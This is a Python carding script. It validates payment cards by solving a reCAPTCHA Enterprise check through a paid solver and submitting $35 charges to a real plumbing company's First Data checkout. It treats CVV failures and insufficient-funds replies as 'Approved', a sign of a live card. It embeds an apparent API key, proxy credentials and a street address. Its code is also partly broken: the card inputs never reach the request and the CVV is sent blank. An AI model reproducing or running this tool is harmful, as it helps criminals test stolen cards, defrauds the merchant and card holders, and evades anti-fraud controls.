import random
import string
import asyncio
import capsolver
from httpx import AsyncClient

async def pzyy(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(proxies=proxyg) as web:
        def random_email():

            name = ''.join(random.choices(string.ascii_lowercase, k=8))
            domains = ['@gmail.com', '@hotmail.com']
            return name + random.choice(domains)

        email = random_email()
        capsolver.api_key = "CAP-5D246BDACA192D1EAC3F1494BE61BA77"
                
        g_response = (await asyncio.to_thread(lambda: capsolver.solve({
        "type": "ReCaptchaV2EnterpriseTaskProxyLess",
        "websiteKey": '6LfBt9wmAAAAAFlQ5-gfCfZNq4OfsDjgam-BI73y',
        "websiteURL": 'https://checkout.globalgatewaye4.firstdata.com/pay/',
        "proxy": "http://isp3824:DZSbj@154.6.232.2:61234",
        "enterprisePayload": {
            "s": "payment_form",
            "action": "submit"
        },
        "minScore": 0.7
        })))['gRecaptchaResponse']
    
        req1 = await web.get('https://www.sweetairplumbing.com/')

        x_login = req1.text.split('name=&quot;x_login&quot; value=&quot;')[1].split('&quot;')[0]
        x_fp_sequence = req1.text.split('name=&quot;x_fp_sequence&quot; value=&quot;')[1].split('&quot;')[0]
        x_fp_hash = req1.text.split('name=&quot;x_fp_hash&quot; value=&quot;')[1].split('&quot;')[0]

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://887605593-atari-embeds.googleusercontent.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://887605593-atari-embeds.googleusercontent.com/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = {
            'x_login': x_login,
            'x_show_form': 'PAYMENT_FORM',
            'x_fp_sequence': x_fp_sequence,
            'x_fp_hash': x_fp_hash,
            'x_amount': '',
            'x_currency_code': 'USD',
            'x_test_request': 'FALSE',
            'x_relay_response': '',
            'donation_prompt': '',
            'button_code': 'Pay Now Sweet Air Plumbing Payment',
        }

        req2 = await web.post('https://checkout.globalgatewaye4.firstdata.com/pay', headers=headers, data=data)


        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/json; charset=UTF-8',
            'hcorequestsource': 'CloverHCO',
            'origin': 'https://checkout.globalgatewaye4.firstdata.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        json_data = {
            'cc_expiry': '0228',
            'cardholder_name': 'Ale Monroe',
            'cvv': '',
            'customerEmail': email,
            'paymentType': 'payNowDonateNow',
            'customerFirstName': '',
            'customerLastName': '',
            'tax1_amount': '',
            'customer_ref': '',
            'zip': '07050',
            'password': '',
            'transaction_type': '00',
            'xlogin': x_login,
            'gateway_id': '',
            'split_tender_id': '',
            'language': 'en',
            'hashKey': x_fp_hash,
            'amount': '35',
            'recurringPlanId': '',
            'recurringPlanName': '',
            'recurringAmount': '',
            'recurringActive': '',
            'recurringInterval': '',
            'recurringIntervalCount': '',
            'recurringMerchantId': '',
            'recurringDeveloperAppId': '',
            'recurringSubscriptionCount': '',
            'recurringActiveSubscriptionCount': '',
            'recurringStartDate': '',
            'recurringEndDate': '',
            'recaptchaToken': g_response,
            'address': {
                'address1': '103-105 Central Ave',
                'city': 'Orange',
                'state': 'NJ',
                'country_code': 'Estados Unidos',
                'zip': '07050-382',
            },
            'cvd_presence_indicator': '9',
        }

        req3 = await web.post('https://checkout.globalgatewaye4.firstdata.com/payeezyhcoapp/transaction/v1',headers=headers,json=json_data,)
        print(req3.text)
        msg = req3.text
        
        try:
            exact_message = msg.split('"exact_message":"')[1].split('"')[0]
        except IndexError:
            exact_message = "No disponible"

        try:
            bank_message = msg.split('"bank_message":"')[1].split('"')[0]
        except IndexError:
            bank_message = "No disponible"

        if "Approved" in bank_message:
            status = "Approved ✅"
        elif "CVV2/VAK Failure" in bank_message:
            status = "Approved ✅"
        elif "Insufficient Funds" in bank_message:
            status = "Approved ✅"
        elif "Address not Verified" in msg:
            status = "Approved "
        else:
            status = "Declined ❌"

        response = f"{bank_message} - {exact_message}"

        return status, response
